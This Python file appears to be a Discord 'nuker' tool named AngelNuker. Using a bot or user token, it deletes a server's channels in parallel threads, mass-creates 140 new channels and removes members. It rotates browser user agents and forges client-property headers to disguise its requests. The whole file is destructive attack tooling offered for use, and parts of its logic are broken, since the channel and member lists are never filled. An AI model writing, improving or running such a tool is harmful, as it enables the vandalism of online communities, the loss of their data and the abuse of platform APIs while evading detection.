import requests
import time
import random
import threading

class AngelNuker:
    def __init__(self, name: str, token: str, guild_id: int, bot: bool = True):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.2 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.71 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0 Mobile/15E148 Safari/605.1.15"
        ]
        self.name = name
        self.cr_channel_payload = {
            "name": self.name,
            "type": random.choice([0, 2, 15])
        }
        self.bot = bot
        self.token = token
        self.guild_id = guild_id
        self.headers = self._get_headers()
        self.channels = []
        self.members = []
        self.roles = []
    
    def _get_headers(self):
        headers = {
            "Authorization": f"Bot {self.token}" if self.bot else self.token,
            "User-Agent": random.choice(self.user_agents)
        }
        if self.bot:
            headers["X-Super-Properties"] = "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IkNocm9tZSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Mi4wLjQ1MTUuMTMxIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiI5Mi4wLjQ1MTUuMTMxIiwib3NfdmVyc2lvbiI6IjEwLjE1LjciLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTI3OTIsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            headers["X-Context-Properties"] = "eyJsb2NhdGlvbiI6IlJlZ2lzdGVyIn0="
        return {key: value for key, value in headers.items() if value}
    
    def nuke(self):
        self.delete_channels()
        self.wait_for_channels_to_be_deleted()
        self.create_channels(140)
        self.ban_members()
    
    def wait_for_channels_to_be_deleted(self):
        while not self.are_channels_deleted():
            time.sleep(1)
    
    def are_channels_deleted(self):
        response = requests.get(f"https://discord.com/api/v9/guilds/{self.guild_id}/channels", headers=self.headers)
        if response.status_code == 200:
            channel_data = response.json()
            self.channels = [channel['id'] for channel in channel_data]
            return len(self.channels) == 0
        else:
            return False
    
    def delete_channel(self, channel_id):
        response = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=self.headers)
        if response.status_code == 204:
            print(f"Deleted channel {channel_id}")
        else:
            print(f"Failed to delete channel {channel_id}")
    
    def delete_channels(self):
        threads = []
        for channel_id in self.channels:
            thread = threading.Thread(target=self.delete_channel, args=(channel_id,))
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
    
    def create_channel(self):
        response = requests.post(f"https://discord.com/api/v9/guilds/{self.guild_id}/channels", headers=self.headers, json=self.cr_channel_payload)
        if response.status_code == 201:
            channel_id = response.json().get('id')
            if channel_id:
                print(f"Created channel {channel_id}")
            else:
                print("Failed to create channel. Invalid response.")
        else:
            print("Failed to create channel. Request failed.")
    
    def create_channels(self, amount):
        threads = []
        for _ in range(amount):
            thread = threading.Thread(target=self.create_channel)
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
    
    def ban_member(self, member_id):
        response = requests.delete(f"https://discord.com/api/v9/guilds/{self.guild_id}/members/{member_id}", headers=self.headers)
        if response.status_code == 204:
            print(f"Banned member {member_id}")
        else:
            print(f"Failed to ban member {member_id}")
    
    def ban_members(self):
        threads = []
        for member_id in self.members:
            thread = threading.Thread(target=self.ban_member, args=(member_id,))
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
